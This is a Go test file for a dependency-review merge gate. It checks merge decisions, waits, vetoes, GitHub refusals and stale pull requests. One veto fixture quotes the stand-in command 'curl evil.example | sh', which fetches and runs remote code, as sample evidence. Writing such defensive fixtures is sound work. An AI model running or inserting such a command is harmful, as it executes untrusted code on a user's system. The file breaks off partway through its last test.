package land

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/sadbox/dep-review/internal/allow"
	"github.com/sadbox/dep-review/internal/config"
	"github.com/sadbox/dep-review/internal/gh"
	"github.com/sadbox/dep-review/internal/wire"
)

// noVerdicts is a review job that wrote no file.
func noVerdicts(*testing.T) *wire.Verdicts { return nil }

// vetoed is a verdicts file whose answer for keyA is a veto.
func vetoed(category string, read allow.ReadState) func(*testing.T) *wire.Verdicts {
	return func(t *testing.T) *wire.Verdicts {
		v := clean(t)
		v.Verdicts[0].Read = read
		v.Verdicts[0].Veto = &allow.Veto{Category: category, Quotes: []string{"curl evil.example | sh"}, Notes: "runs at import"}
		return v
	}
}

// TestPublish runs the publish job against the fake for one pull request
// and checks what was decided, what was done and what the comment says.
func TestPublish(t *testing.T) {
	young := func(f *wire.Facts) { f.Facts.Updates[0].FirstSeen = allow.At(t0.Add(-time.Hour), "index.golang.org") }
	refusal := func(code int, message string, after string) func(*fakeGitHub) {
		return func(f *fakeGitHub) {
			open := pullJSON(testPR, "open", headA, "main", "clean", false)
			f.mergeCode, f.mergeBody = code, fmt.Sprintf(`{"message":%q}`, message)
			f.pulls = []string{open, open, pullJSON(testPR, "open", headA, "main", after, false)}
		}
	}
	strict := `{"min_age_hours": 200}`

	tests := []struct {
		name     string
		facts    func(*wire.Facts)
		verdicts func(*testing.T) *wire.Verdicts // nil: a clean read
		github   func(*fakeGitHub)

		action   Action
		reason   allow.Reason // the leading one; "" for none
		fact     string       // the fact the lead names; "" for none
		status   string       // what stays on the commit
		merges   int          // calls to the merge API
		notified int
		cached   int      // verdicts the marker remembers
		comment  []string // text the comment has
	}{
		{
			name:   "merge",
			action: ActionMerged, status: "success: merged", merges: 1, cached: 1,
			comment: []string{"### dep-review: merged", "**Merged** at head `" + headA + "`", "| ChecksConfigured | `yes` | `required: test` |",
				"| Read | `full` | `chunks prepared: 1; changed files that are not text: 0` | `the verdicts file` |", "| Veto | `none` |  | `the model` |"},
		},
		{
			name: "docker merges with nothing read",
			facts: func(f *wire.Facts) {
				u := goodUpdate("docker.io/library/golang")
				u.Listed = allow.Yes("docker.io/library/", "policy")
				f.Facts.Ecosystem = allow.Docker
				f.Facts.Updates = []wire.Update{wire.NewUpdate(u, wire.Read{Status: wire.Nothing, Unread: nil, Chunks: nil})}
			},
			action: ActionMerged, status: "success: merged", merges: 1,
			comment: []string{"| Read | `not-applicable` | `nothing` |"},
		},
		{
			name:   "wait on age",
			facts:  young,
			action: ActionWait, reason: allow.ReasonAge, fact: "FirstSeen",
			status: "pending: waiting until 2026-11-25 11:00 UTC", cached: 1,
			comment: []string{"### dep-review: waiting", "**Waiting until 2026-11-25 11:00 UTC.** " + allow.ReasonAge.Explain()},
		},
		{
			name:     "no verdicts file is a read that is retried",
			verdicts: noVerdicts,
			action:   ActionWait, reason: allow.ReasonReadPending, fact: "Read",
			status:  "pending: waiting (read_pending), at most until 2026-11-29 11:00 UTC",
			comment: []string{"**Waiting, at most until 2026-11-29 11:00 UTC.**", "| Read | `none` | `chunks prepared: 1; changed files that are not text: 0` |"},
		},
		{
			name: "a verdict under another fingerprint is no verdict",
			verdicts: func(t *testing.T) *wire.Verdicts {
				v := clean(t)
				v.Verdicts[0].Fingerprint = strings.Repeat("9", 64)
				return v
			},
			action: ActionWait, reason: allow.ReasonReadPending, fact: "Read",
			status: "pending: waiting (read_pending), at most until 2026-11-29 11:00 UTC",
		},
		{
			name:     "a young version that was not read waits for both",
			facts:    young,
			verdicts: noVerdicts,
			action:   ActionWait, reason: allow.ReasonReadPending, fact: "Read",
			status:  "pending: waiting (read_pending), at most until 2026-12-02 11:00 UTC",
			comment: []string{"It cannot merge before 2026-11-25 11:00 UTC either.", "- `age`: " + allow.ReasonAge.Explain()},
		},
		{
			name:   "GitHub does not answer for the rules",
			github: func(f *fakeGitHub) { f.rulesCode, f.rules = 500, `{"message":"Server Error"}` },
			action: ActionWait, reason: allow.ReasonSourceUnavailable, fact: "ChecksConfigured",
			status: "pending: waiting (source_unavailable), at most until 2026-11-29 11:00 UTC", cached: 1,
			comment: []string{"The fact: `ChecksConfigured` of the pull request is `unavailable`"},
		},
		{
			// Neither clock answered in the fetch job, so nothing says when
			// the wait began: no deadline, and no date the comment made up.
			name: "a wait with no start has no deadline",
			facts: func(f *wire.Facts) {
				f.Facts.Opened = time.Time{}
				f.Facts.Updates[0].FirstSeen = allow.UnavailableTime("GitHub did not answer", "GitHub: the pull request")
			},
			action: ActionWait, reason: allow.ReasonSourceUnavailable, fact: "FirstSeen",
			status: "pending: waiting (source_unavailable)", cached: 1,
			comment: []string{"**Waiting.** " + allow.ReasonSourceUnavailable.Explain() + " No deadline is set yet"},
		},
		{
			name: "the rules cannot be read",
			github: func(f *fakeGitHub) {
				f.rulesCode, f.rules = 403, `{"message":"Resource not accessible by integration"}`
			},
			action: ActionPerson, reason: allow.ReasonFactMissing, fact: "ChecksConfigured",
			status: "failure: needs a person: fact_missing", notified: 1, cached: 1,
			comment: []string{"is `not gathered`: `the branch rules could not be read (HTTP 403)`"},
		},
		{
			name:   "no rules on the default branch",
			github: func(f *fakeGitHub) { f.rules = `[]` },
			action: ActionPerson, reason: allow.ReasonChecksNotConfigured, fact: "ChecksConfigured",
			status: "failure: needs a person: checks_not_configured", notified: 1, cached: 1,
		},
		{
			name: "the only required check is the gate's own",
			github: func(f *fakeGitHub) {
				f.rules = `[{"type":"required_status_checks","parameters":{"required_status_checks":[{"context":"dep-review"}]}}]`
			},
			action: ActionPerson, reason: allow.ReasonChecksNotConfigured, fact: "ChecksConfigured",
			status: "failure: needs a person: checks_not_configured", notified: 1, cached: 1,
		},
		{
			name:   "the facts file cannot grant ChecksConfigured",
			facts:  func(f *wire.Facts) { f.Facts.ChecksConfigured = allow.Yes("trust me", "fetch") },
			github: func(f *fakeGitHub) { f.rules = `[]` },
			action: ActionPerson, reason: allow.ReasonChecksNotConfigured, fact: "ChecksConfigured",
			status: "failure: needs a person: checks_not_configured", notified: 1, cached: 1,
		},
		{
			name: "person: the pin is not what the registry reports",
			facts: func(f *wire.Facts) {
				f.Facts.Updates[0].Bound = allow.No("h1:abc pinned, h1:xyz served", "go mod download")
			},
			action: ActionPerson, reason: allow.ReasonNotBound, fact: "Bound",
			status: "failure: needs a person: not_bound", notified: 1, cached: 1,
			comment: []string{
				"### dep-review: needs a person",
				"The fact: `Bound` of `example.com/m` `v1.2.3` to `v1.3.0` is `no`: `h1:abc pinned, h1:xyz served` (source: `go mod download`).",
				"On its own: person (`not_bound`).",
			},
		},
		{
			name:   "person: an advisory against the new version",
			facts:  func(f *wire.Facts) { f.Facts.Updates[0].Clean = allow.No("GHSA-xxxx affects v1.3.0", "advisories") },
			action: ActionPerson, reason: allow.ReasonNotClean, fact: "Clean",
			status: "failure: needs a person: not_clean", notified: 1, cached: 1,
		},
		{
			name:   "person: a new install script",
			facts:  func(f *wire.Facts) { f.Facts.Updates[0].NoRegress = allow.No("postinstall added", "tarball") },
			action: ActionPerson, reason: allow.ReasonRegress, fact: "NoRegress",
			status: "failure: needs a person: regress", notified: 1, cached: 1,
		},
		{
			name:   "person: a major of an unlisted name",
			facts:  func(f *wire.Facts) { f.Facts.Updates[0].Major = allow.Yes("v1 to v2", "x/mod/semver") },
			action: ActionPerson, reason: allow.ReasonMajorUnlisted, fact: "Major",
			status: "failure: needs a person: major_unlisted", notified: 1, cached: 1,
		},
		{
			name: "person: a fact nobody gathered",
			facts: func(f *wire.Facts) {
				f.Facts.Updates[0].Clean = allow.Fact{Value: "the advisory answer had no versions"}
			},
			action: ActionPerson, reason: allow.ReasonFactMissing, fact: "Clean",
			status: "failure: needs a person: fact_missing", notified: 1, cached: 1,
			comment: []string{"The fact: `Clean` of `example.com/m` `v1.2.3` to `v1.3.0` is `not gathered`"},
		},
		{
			name: "person: the pull request's own fact leads",
			facts: func(f *wire.Facts) {
				f.Facts.Shape = allow.No("README.md changed", "git diff")
				f.Facts.Updates[0].Bound = allow.No("h1:abc pinned, h1:xyz served", "go mod download")
			},
			action: ActionPerson, reason: allow.ReasonShape, fact: "Shape",
			status: "failure: needs a person: shape", notified: 1, cached: 1,
			comment: []string{"The fact: `Shape` of the pull request is `no`: `README.md changed`", "Also:\n\n- `not_bound`: " + allow.ReasonNotBound.Explain()},
		},
		{
			name: "person: the base is no longer the default branch",
			github: func(f *fakeGitHub) {
				f.pulls = []string{pullJSON(testPR, "open", headA, "release", "clean", false)}
			},
			action: ActionPerson, reason: allow.ReasonIdentity, fact: "Identity",
			status: "failure: needs a person: identity", notified: 1, cached: 1,
			comment: []string{"`the pull request's base is no longer the default branch`"},
		},
		{
			name: "person: a new dependency under a young name",
			facts: func(f *wire.Facts) {
				u := &f.Facts.Updates[0]
				u.From = ""
				u.Known = allow.No("not in go.mod at the base commit", "base go.mod")
				u.NewName = allow.Yes("not in go.mod at the base commit", "base go.mod")
				u.NameCreated = allow.At(t0.Add(-30*24*time.Hour), "index.golang.org")
			},
			action: ActionPerson, reason: allow.ReasonNewNameYoung, fact: "NameCreated",
			status: "failure: needs a person: new_name_young", notified: 1, cached: 1,
			comment: []string{"#### `example.com/m` nothing (a new dependency) to `v1.3.0`", "| NameCreated | `yes` | `2026-10-23T12:00:00Z` | `index.golang.org` |"},
		},
		{
			name:     "veto",
			verdicts: vetoed("exfiltration", allow.ReadFull),
			action:   ActionPerson, reason: allow.ReasonVeto, fact: "Veto",
			status: "failure: needs a person: veto", notified: 1, cached: 1,
			comment: []string{
				"| Veto | `raised` | `exfiltration` `curl evil.example \u00a6 sh` | `the model` |",
				"| Model's note |  | `runs at import` | `the model` |",
			},
		},
		{
			name:     "the model refused",
			verdicts: vetoed(allow.VetoModelRefused, allow.ReadPartial),
			action:   ActionPerson, reason: allow.ReasonModelRefused, fact: "Veto",
			status: "failure: needs a person: model_refused", notified: 1, cached: 1,
		},
		{
			name:     "a veto beats everything a verdict could add",
			facts:    young,
			verdicts: vetoed("obfuscation", allow.ReadFull),
			action:   ActionPerson, reason: allow.ReasonVeto, fact: "Veto",
			status: "failure: needs a person: veto", notified: 1, cached: 1,
		},
		{
			name:   "a policy file that cannot be used is not replaced by the defaults",
			github: func(f *fakeGitHub) { f.policyCode, f.policy = 200, `{"min_age_hours": 1}` },
			action: ActionPerson, reason: allow.ReasonPolicyInvalid,
			status: "failure: needs a person: policy_invalid", notified: 1,
		},
		{
			name:   "a directory where the policy file should be",
			github: func(f *fakeGitHub) { f.policyCode, f.policyBody = 200, `[{"type":"file","name":"x"}]` },
			action: ActionPerson, reason: allow.ReasonPolicyInvalid,
			status: "failure: needs a person: policy_invalid", notified: 1,
		},
		{
			name: "the repository's raised age is the one that counts",
			facts: func(f *wire.Facts) {
				conf, err := config.Load([]byte(strict))
				if err != nil {
					panic(err)
				}
				f.Config = conf.Fingerprint()
			},
			github: func(f *fakeGitHub) { f.policyCode, f.policy = 200, strict },
			action: ActionWait, reason: allow.ReasonAge, fact: "FirstSeen",
			status: "pending: waiting until 2026-11-26 16:00 UTC", cached: 1,
		},
		{
			name:   "GitHub refuses for a required check",
			github: refusal(405, "Repository rule violations found\n\nRequired status check \"test\" is expected.\n\n", "clean"),
			action: ActionWait, reason: allow.ReasonChecksPending,
			status: "pending: waiting (checks_pending), at most until 2026-11-29 11:00 UTC", merges: 1, cached: 1,
			comment: []string{"**Waiting, at most until 2026-11-29 11:00 UTC.** " + allow.ReasonChecksPending.Explain()},
		},
		{
			name:   "GitHub refuses in words the gate does not know, and calls the pull request blocked",
			github: refusal(405, "Merging is blocked", "blocked"),
			action: ActionWait, reason: allow.ReasonChecksPending,
			status: "pending: waiting (checks_pending), at most until 2026-11-29 11:00 UTC", merges: 1, cached: 1,
		},
		{
			name:   "GitHub refuses for something else",
			github: refusal(405, "Pull Request is not mergeable", "dirty"),
			action: ActionRefused,
			status: "error: GitHub refused the merge; see the comment", merges: 1, notified: 1, cached: 1,
			comment: []string{"### dep-review: GitHub refused the merge", "GitHub answered: `HTTP 405: Pull Request is not mergeable`"},
		},
		{
			// Two merges at the same moment: the second is told to try
			// again, and the scheduled job does.
			name:   "GitHub says the base branch was modified",
			github: refusal(405, "Base branch was modified. Review and try the merge again.", "unknown"),
			action: ActionWait, reason: allow.ReasonChecksPending,
			status: "pending: waiting (checks_pending), at most until 2026-11-29 11:00 UTC", merges: 1, cached: 1,
			comment: []string{"GitHub's answer to the merge call this time: `Base branch was modified. Review and try the merge again.`."},
		},
		{
			name:   "GitHub says something like it",
			github: refusal(405, "Base branch was modified.", "unknown"),
			action: ActionRefused,
			status: "error: GitHub refused the merge; see the comment", merges: 1, notified: 1, cached: 1,
		},
		{
			name:   "GitHub refuses a review it wants and a check",
			github: refusal(405, "Required status check \"test\" is expected.\nAt least 1 approving review is required.", "unknown"),
			action: ActionRefused,
			status: "error: GitHub refused the merge; see the comment", merges: 1, notified: 1, cached: 1,
		},
		{
			name:   "GitHub answers without merging",
			github: func(f *fakeGitHub) { f.mergeBody = `{"merged":false}` },
			action: ActionRefused,
			status: "error: GitHub refused the merge; see the comment", merges: 1, notified: 1, cached: 1,
		},
		{
			name: "the merge call fails on the way back and the pull request is merged",
			github: func(f *fakeGitHub) {
				f.mergeCode, f.mergeBody, f.mergedAfter = 502, `{"message":"Bad Gateway"}`, true
			},
			action: ActionMerged, status: "success: merged", merges: 1, cached: 1,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := newFake(t)
			if tc.github != nil {
				tc.github(f)
			}
			facts := goodFacts(t)
			if tc.facts != nil {
				tc.facts(&facts)
			}
			verdicts := clean(t)
			if tc.verdicts != nil {
				verdicts = tc.verdicts(t)
			}
			rec := &recorder{}
			res, err := publish(t, f.config(t0, rec), files(t, facts, verdicts))
			if err != nil {
				t.Fatal(err)
			}

			if res.Action != tc.action {
				t.Errorf("action %q, want %q (decision %+v)", res.Action, tc.action, res.Decision)
			}
			var reason allow.Reason
			if len(res.Decision.Reasons) > 0 {
				reason = res.Decision.Reasons[0]
			}
			if reason != tc.reason {
				t.Errorf("leading reason %q, want %q (all: %v)", reason, tc.reason, res.Decision.Reasons)
			}
			if got := f.count("PUT", "/merge"); got != tc.merges {
				t.Errorf("%d merge calls, want %d", got, tc.merges)
			}
			statuses := f.statuses(headA)
			if len(statuses) == 0 || statuses[len(statuses)-1] != tc.status {
				t.Errorf("statuses %q, want the last to be %q", statuses, tc.status)
			}
			if len(rec.got) != tc.notified {
				t.Errorf("%d notifications, want %d: %+v", len(rec.got), tc.notified, rec.got)
			}

			body := f.gateComment(testPR)
			m, ok := parseMarker(body)
			if !ok || m.Outcome != tc.action || m.Head != headA {
				t.Errorf("marker %+v (parsed: %t), want outcome %q for the head", m, ok, tc.action)
			}
			if len(m.Cache) != tc.cached {
				t.Errorf("the marker remembers %d verdicts, want %d", len(m.Cache), tc.cached)
			}
			want := append([]string{}, tc.comment...)
			if tc.reason != "" {
				// The lead: why, and the cheapest way out.
				want = append(want, tc.reason.Explain(), "**Way out:** "+tc.reason.Hint())
			}
			if tc.fact != "" {
				want = append(want, "The fact: `"+tc.fact+"` of ")
			} else if strings.Contains(body, "The fact: ") {
				t.Errorf("the lead names a fact, and this reason has none")
			}
			for _, s := range want {
				if !strings.Contains(body, s) {
					t.Errorf("the comment lacks %q", s)
				}
			}
			if t.Failed() {
				t.Logf("comment:\n%s", body)
			}
		})
	}
}

// TestMergeCall checks what the gate sends to the merge API, and that the
// pull request was read again just before.
func TestMergeCall(t *testing.T) {
	f := newFake(t)
	if _, err := publish(t, f.config(t0, nil), files(t, goodFacts(t), clean(t))); err != nil {
		t.Fatal(err)
	}
	var before call
	for _, c := range f.calls {
		if c.method == "PUT" {
			if c.body != `{"merge_method":"squash","sha":"`+headA+`"}` {
				t.Errorf("merge body %s", c.body)
			}
			if before.method != "GET" || before.path != "/repos/o/r/pulls/7" {
				t.Errorf("the request before the merge was %s %s, want a read of the pull request", before.method, before.path)
			}
		}
		before = c
	}
	if got := f.statuses(headA); len(got) != 2 || !strings.HasPrefix(got[0], "success: ") {
		t.Errorf("statuses %q: dep-review may itself be a required check, so success comes before the merge call", got)
	}
}

// TestStale: a pull request that is not what the facts describe is left
// alone.
func TestStale(t *testing.T) {
	open := pullJSON(testPR, "open", headA, "main", "clean", false)
	tests := []struct {
		name   string
		github func(*fakeGitHub)
		// writes are the requests that may still be made, by method and
		// the end of the path.
		writes []string
	}{
		{"the head moved before publish", func(f *fakeGitHub) {
			f.pulls = []string{pullJSON(testPR, "open", headB, "main", "clean", false)}
		}, nil},
		{"closed before publish", func(f *fakeGitHub) {
			f.pulls = []string{pullJSON(testPR, "closed", headA, "main", "clean", false)}
		}, nil},
		{"the head moved between the decision and the merge", func(f *fakeGitHub) {
			f.pulls = []string{open, pullJSON(testPR, "open", headB, "main", "clean", false)}
		}, []string{"POST statuses/" + headA, "POST statuses/" + headA}},
		{"the base changed between the decision and the merge", func(f *fakeGitHub) {
			f.pulls = []string{open, pullJSON(testPR, "open", headA, "release", "clean", false)}
		}, []string{"POST statuses/" + headA, "POST statuses/" + headA}},
		{"GitHub says the head is not the one asked for", func(f *fakeGitHub) {
			f.mergeCode, f.mergeBody = 409, `{"message":"Head branch was modified. Review and try the merge again."}`
		}, []string{"POST statuses/" + headA, "PUT pulls/7/merge", "POST statuses/" + headA}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := newFake(t)
			tc.github(f)
			rec := &recorder{}
			res, err := publish(t, f.config(t0, rec), files(t, goodFacts(t), clean(t)))
			if err != nil {
				t.Fatal(err)
			}
			if res.Action != ActionStale || res.Note == "" {
				t.Errorf("result %+v, want stale with a note", res)
			}
			var got []string
			for _, c := range f.writes() {
				got = append(got, c.method+" "+strings.TrimPrefix(c.path, "/repos/o/r/"))
			}
			if strings.Join(got, ", ") != strings.Join(tc.writes, ", ") {
				t.Errorf("writes %q, want %q", got, tc.writes)
			}
			if s := f.statuses(headA); len(s) > 0 && strings.HasPrefix(s[len(s)-1], "success") {
				t.Errorf("statuses %q: a success was left on a commit that was not merged", s)
			}
			if len(rec.got) != 0 {
				t.Errorf("notified %+v", rec.got)
			}
		})
	}
}

// TestNoDecision: what Decide and Act refuse to conclude anything from.
// Nothing is written in any of these.
func TestNoDecision(t *testing.T) {
	tests := []struct {
		name   string
		facts  func(*wire.Facts)
		github func(*fakeGitHub)
		is     error
		writes int
	}{
		{name: "the settings changed since fetch", is: ErrConfigChanged,
			github: func(f *fakeGitHub) { f.policyCode, f.policy = 200, `{"min_age_hours": 200}` }},
		{name: "the policy file cannot be fetched",
			github: func(f *fakeGitHub) { f.policyCode = 500 }},
		{name: "facts for another repository",
			facts: func(f *wire.Facts) { f.PullRequest.Repo = "o/other" }},
		{name: "the pull request cannot be read",
			facts: func(f *wire.Facts) { f.PullRequest.Number = 8 }},
		{name: "the merge call gets no answer and nothing was merged", writes: 2,
			github: func(f *fakeGitHub) { f.mergeCode, f.mergeBody = 502, `{"message":"Bad Gateway"}` }},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			f := newFake(t)
			f.lenient = true // a pull request the fake does not have is one of the cases
			if tc.github != nil {
				tc.github(f)
			}
			facts := goodFacts(t)
			if tc.facts != nil {
				tc.facts(&facts)
			}
			_, err := publish(t, f.config(t0, nil), files(t, facts, clean(t)))
			if err == nil || (tc.is != nil && !errors.Is(err, tc.is)) {
				t.Fatalf("error %v, want one (%v)", err, tc.is)
			}
			if got := f.writes(); len(got) != tc.writes {
				t.Errorf("%d writes, want %d: %+v", len(got), tc.writes, got)
			}
			if n := len(f.comments[testPR]); n != 0 {
				t.Errorf("%d comments written", n)
			}
		})
	}

	t.Run("a file that does not decode", func(t *testing.T) {
		f := newFake(t)
		dir := files(t, goodFacts(t), clean(t))
		for _, name := range []string{wire.VerdictsFile, wire.FactsFile} {
			overwrite(t, dir, name, `{"version":1,"read":"full"}`)
			if _, err := Decide(context.Background(), f.config(t0, nil), filepath.Join(dir, wire.FactsFile), filepath.Join(dir, wire.VerdictsFile)); err == nil {
				t.Errorf("%s: no error for a file with a member the format does not have", name)
			}
		}
		if len(f.calls) != 0 {
			t.Errorf("GitHub was asked %d times about files that were not read", len(f.calls))
		}
	})
}

// TestWaitOnChecksThenDeadline follows one pull request that GitHub will
// not merge: it waits while the deadline has not passed, and is a
// person's afterwards. Both runs decide afresh.
func TestWaitOnChecksThenDeadline(t *testing.T) {
	f := newFake(t)
	f.mergeCode, f.mergeBody = 405, `{"message":"Required status check \"test\" is failing."}`
	dir := files(t, goodFacts(t), clean(t))
	rec := &recorder{}

	res, err := publish(t, f.config(t0, rec), dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.Action != ActionWait || len(res.Decision.Reasons) != 1 || res.Decision.Reasons[0] != allow.ReasonChecksPending {
		t.Fatalf("first run: %+v, want a wait on checks", res)
	}
	deadline := res.Decision.Deadline
	if want := t0.Add(-time.Hour).Add(7 * 24 * time.Hour); !deadline.Equal(want) {
		t.Fatalf("deadline %s, want %s: seven days after the pull request was opened", deadline, want)
	}
	if m, _ := parseMarker(f.gateComment(testPR)); m.Outcome != ActionWait || !m.Deadline.Equal(deadline) {
		t.Errorf("marker %+v, want a wait until the deadline", m)
	}
	if len(rec.got) != 0 {
		t.Errorf("a wait notified: %+v", rec.got)
	}

	// One second before the deadline it still waits; at the deadline it
	// does not.
	if res, err = publish(t, f.config(deadline.Add(-time.Second), rec), dir); err != nil || res.Action != ActionWait {
		t.Fatalf("just before the deadline: %+v, %v", res, err)
	}
	res, err = publish(t, f.config(deadline, rec), dir)
	if err != nil {
		t.Fatal(err)
	}
	if res.Action != ActionPerson || len(res.Decision.Reasons) != 1 || res.Decision.Reasons[0] != allow.ReasonChecksDeadline {
		t.Fatalf("at the deadline: %+v, want a person for checks_deadline", res)
	}
	if got := f.count("PUT", "/merge"); got != 3 {
		t.Errorf("%d merge calls, want 3: GitHub is asked every time", got)
	}
	s := f.statuses(headA)
	if s[len(s)-1] != "failure: needs a person: checks_deadline" {
		t.Errorf("statuses %q", s)
	}
	body := f.gateComment(testPR)
	for _, want := range []string{"### dep-review: needs a person", allow.ReasonChecksDeadline.Explain(), allow.ReasonChecksDeadline.Hint()} {
		if !strings.Contains(body, want) {
			t.Errorf("the comment lacks %q:\n%s", want, body)
		}
	}
	if len(rec.got) != 1 {
		t.Errorf("%d notifications, want 1", len(rec.got))
	}
}

// TestOneCommentOneNotification: every run updates the same comment, and
// a head is notified for once.
func TestOneCommentOneNotification(t *testing.T) {
	f := newFake(t)
	// A comment the gate's first version left, and one by somebody else
	// that only looks like the gate's.
	f.comments[testPR] = []*fakeComment{
		{1, "mallory", marker{Outcome: ActionWait, Head: headA, Notified: []string{headA}}.String() + "\n### dep-review: waiting\n"},
		{2, testBot, "<!-- dep-review:v1 notified= stuck= -->\n### dep-review: approved\n"},
	}
	facts := goodFacts(t)
	facts.Facts.Updates[0].Bound = allow.No("h1:abc pinned, h1:xyz served", "go mod download")
	rec := &recorder{}

	failing := &recorder{err: errors.New("pushover is down")}
	if _, err := publish(t, f.config(t0, failing), files(t, facts, clean(t))); err == nil || !strings.Contains(err.Error(), "pushover is down") {
		t.Fatalf("error %v, want the notifier's", err)
	}
	if m, ok := parseMarker(f.gateComment(testPR)); !ok || len(m.Notified) != 0 {
		t.Errorf("marker %+v: a notification that failed was remembered as sent, or the comment was not written", m)
	}
	if s := f.statuses(headA); len(s) != 1 || s[0] != "failure: needs a person: not_bound" {
		t.Errorf("statuses %q: the status is set although the notification failed", s)
	}

	for run := 1; run <= 3; run++ {
		if _, err := publish(t, f.config(t0, rec), files(t, facts, clean(t))); err != nil {
			t.Fatal(err)
		}
	}
	if len(rec.got) != 1 {
		t.Fatalf("%d notifications for one head, want 1", len(rec.got))
	}
	want := Message{
		Title: "dep-review: o/r#7",
		Body:  "o/r#7 needs a person (not_bound): " + allow.ReasonNotBound.Explain(),
		URL:   "https://github.com/o/r/pull/7",
	}
	if rec.got[0] != want {
		t.Errorf("notification %+v, want %+v", rec.got[0], want)
	}
	if posts, patches := f.count("POST", "/issues/7/comments"), f.count("PATCH", "/issues/comments/2"); posts != 0 || patches != 4 {
		t.Errorf("%d comments created and %d updates of the gate's own, want 0 and 4", posts, patches)
	}
	if got := f.comments[testPR][0].body; !strings.HasSuffix(got, "### dep-review: waiting\n") {
		t.Errorf("somebody else's comment was changed: %q", got)
	}

	// A new head is a new question.
	facts.PullRequest.Head = headB
	f.pulls = []string{pullJSON(testPR, "open", headB, "main", "clean", false)}
	if _, err := publish(t, f.config(t0, rec), files(t, facts, clean(t))); err != nil {
		t.Fatal(err)
	}
	if m, _ := parseMarker(f.gateComment(testPR)); len(rec.got) != 2 || strings.Join(m.Notified, ",") != headA+","+headB {
		t.Errorf("%d notifications, marker %+v: want a second one, for the new head", len(rec.got), m.Notified)
	}
}

// TestChecksRefusalShape is the one place the gate reads GitHub's prose:
// a 405 from the merge call whose every line is about a required status
// check. Anything else is not that.
func TestChecksRefusalShape(t *testing.T) {
	long := "Repository rule violations found\n\n" + strings.Repeat("Required status check \"a long name / with a matrix (ubuntu-26.04)\" is expected.\n\n", 30)
	tests := []struct {
		message string
		want    bool
	}{
		{`Required status check "test" is expected.`, true},
		{`Required status check "lint / lint" is failing.`, true},
		{`Required status check "sandbox (ubuntu-26.04)" is in progress.`, true},
		{`2 of 3 required status checks are expected.`, true},
		{"Repository rule violations found\n\nRequired status check \"test\" is expected.\n\n", true},
		{"Repository rule violations found\n\nRequired status check \"a\" is expected.\n\n1 of 2 required status checks are pending.", true},
		{long[:gh.MaxMessage], true}, // as internal/gh cuts it, in the middle of a line

		{"", false},
		{"Repository rule violations found", false},
		{"Pull Request is not mergeable", false},
		{"Base branch was modified. Review and try the merge again.", false},
		{"At least 1 approving review is required by reviewers with write access.", false},
		{"Repository rule violations found\n\nRequired status check \"test\" is expected.\n\nChanges must be made through a pull request.", false},
		{"Changes must be made through a pull request.\nRequired status check \"test\" is expected.", false},
		{`Something about a Required status check "test" that is expected.`, false},
		{`required status check "test" is expected.`, false},
		{"Squash merges are not allowed on this repository.", false},
	}
	for _, tc := range tests {
		if got := aboutChecksOnly(tc.message); got != tc.want {
			t.Errorf("aboutChecksOnly(%q) = %t, want %t", tc.message, got, tc.want)
		}
	}
}

// TestConfigCheck: a job that is not told who the gate app is believes
// nobody's comment, so it does not start.
func TestConfigCheck(t *testing.T) {
	f := newFake(t)
	good := f.config(t0, nil)
	for name, change := range map[string]func(*Config){
		"no client":       func(c *Config) { c.GitHub = nil },
		"bad repository":  func(c *Config) { c.Repo = "o/r/../x" },
		"no app login":    func(c *Config) { c.BotLogin = "" },
		"a user's login":  func(c *Config) { c.BotLogin = "mallory" },
		"only the suffix": func(c *Config) { c.BotLogin = "[bot]" },
	} {
		cfg := good
		change(&cfg)
		if _, err := Decide(context.Background(), cfg, filepath.Join(t.TempDir(), wire.FactsFile), ""); err == nil {
			t.Errorf("%s: Decide ran", name)
		}
		if _, err := Act(context.Background(), cfg, Evaluation{}); err == nil {
			t.Errorf("%s: Act ran", name)
		}
		if _, err := Waiting(context.Background(), cfg); err == nil {
			t.Errorf("%s: Waiting ran", name)
		}
		if _, err := Cached(context.Background(), cfg, testPR); err == nil {
			t.Errorf("%s: Cached ran", name)
		}
	}
	// Act works on what Decide made of the files, not on a decision someone
	// wrote down.
	forged := Evaluation{PullRequest: wire.PullRequest{Repo: testRepo, Number: testPR, Head: headA}, Decision: allow.Decision{Outcome: allow.Merge}}
	if _, err := Act(context.Background(), good, forged); err == nil {
		t.Error("Act ran on an evaluation Decide did not return")
	}
	if len(f.calls) != 0 {
		t.Errorf("%d requests were made", len(f.calls))
	}
}

// TestDefaultBranch: the default branch goes into request paths, so only
// a plain name is taken from GitHub's answer.
func TestDefaultBranch(t *testing.T) {
	for name, ok := range map[string]bool{
		"main": true, "master": true, "release/1.x": true, "trunk-2": true,
		"": false, "..": false, "a/../b": false, "/main": false, "main/": false, "a//b": false,
		"main?ref=x": false, "main#x": false, "ma in": false, "m%61in": false, "-main": false,
		strings.Repeat("a", 256): false,
	} {
		var pr pull
		if err := json.Unmarshal([]byte(pullJSON(testPR, "open", headA, "main", "clean", false)), &pr); err != nil {
			t.Fatal(err)
		}
		pr.Base.Repo.DefaultBranch = name
		got, err := pr.defaultBranch(testRepo)
		if (err == nil) != ok || (ok && got != name) {
			t.Errorf("default branch %q: %q, %v; accepted should be %t", name, got, err, ok)
		}
	}
	var pr pull
	if _, err := pr.defaultBranch(testRepo); err == nil {
		t.Error("a pull request without a base repository has a default branch")
	}
	json.Unmarshal([]byte(pullJSON(testPR, "open", headA, "main", "clean", false)), &pr)
	if _, err := pr.defaultBranch("o/other"); err == nil {
		t.Error("a pull request of another repository was accepted")
	}
}

// TestStatusBeforeComment: the status says the final outcome before the
// comment is touched, so a comment that cannot be read or written never
// leaves the success of before the merge call on a head that was not
// merged.
func TestStatusBeforeComment(t *testing.T) {
	open := pullJSON(testPR, "open", headA, "main", "clean", false)
	for message, want := range map[string]string{
		"Pull Request is not mergeable":             "error: GitHub refused the merge; see the comment",
		`Required status check "test" is expected.`: "pending: waiting (checks_pending), at most until 2026-11-29 11:00 UTC",
	} {
		f := newFake(t)
		f.mergeCode, f.mergeBody = 405, fmt.Sprintf(`{"message":%q}`, message)
		f.pulls = []string{open, open, pullJSON(testPR, "open", headA, "main", "dirty", false)}
		f.commentsCode = 500
		if _, err := publish(t, f.config(t0, nil), files(t, goodFacts(t), clean(t))); err == nil {
			t.Fatalf("%s: no error although the comments could not be read", message)
		}
